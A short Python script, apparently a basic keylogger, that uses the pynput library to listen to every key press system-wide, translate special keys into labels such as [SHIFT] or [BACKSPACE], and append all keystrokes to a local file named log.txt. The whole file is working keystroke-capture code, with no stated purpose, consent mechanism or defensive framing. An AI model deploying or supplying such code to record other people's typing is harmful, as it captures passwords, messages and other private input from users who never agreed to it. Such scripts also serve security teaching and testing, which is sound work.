from pynput.keyboard import Listener, Key


def writeToFile(key):
    try:
        # Map special keys to their string equivalents
        if key == Key.alt or key == Key.alt_l or key == Key.alt_r or key == Key.alt_gr:
            letter = '[ALT]'
        elif key == Key.backspace:
            letter = '[BACKSPACE]'
        elif key == Key.caps_lock:
            letter = '[CAPS_LOCK]'
        elif key == Key.cmd or key == Key.cmd_l or key == Key.cmd_r:
            letter = '[CMD]'
        elif key == Key.ctrl or key == Key.ctrl_l or key == Key.ctrl_r:
            letter = '[CTRL]'
        elif key == Key.delete:
            letter = '[DELETE]'
        elif key == Key.down:
            letter = '[DOWN]'
        elif key == Key.end:
            letter = '[END]'
        elif key == Key.enter:
            letter = '\n'
        elif key == Key.esc:
            letter = '[ESC]'
        elif key == Key.f1:
            letter = '[F1]'
        elif key == Key.home:
            letter = '[HOME]'
        elif key == Key.insert:
            letter = '[INSERT]'
        elif key == Key.left:
            letter = '[LEFT]'
        elif key == Key.menu:
            letter = '[MENU]'
        elif key == Key.num_lock:
            letter = '[NUM_LOCK]'
        elif key == Key.page_down:
            letter = '[PAGE_DOWN]'
        elif key == Key.page_up:
            letter = '[PAGE_UP]'
        elif key == Key.pause:
            letter = '[PAUSE]'
        elif key == Key.print_screen:
            letter = '[PRINT_SCREEN]'
        elif key == Key.right:
            letter = '[RIGHT]'
        elif key == Key.scroll_lock:
            letter = '[SCROLL_LOCK]'
        elif key == Key.shift or key == Key.shift_l or key == Key.shift_r:
            letter = '[SHIFT]'
        elif key == Key.space:
            letter = ' '
        elif key == Key.tab:
            letter = '[TAB]'
        elif key == Key.up:
            letter = '[UP]'
        else:
            # For normal keys, we remove the surrounding single quotes
            letter = str(key).replace("'", "")

        # Append the key press to the log file
        with open("log.txt", 'a') as f:
            f.write(letter)
    except Exception as e:
        print(f"Error: {e}")


# Start the listener
with Listener(on_press=writeToFile) as l:
    l.join()
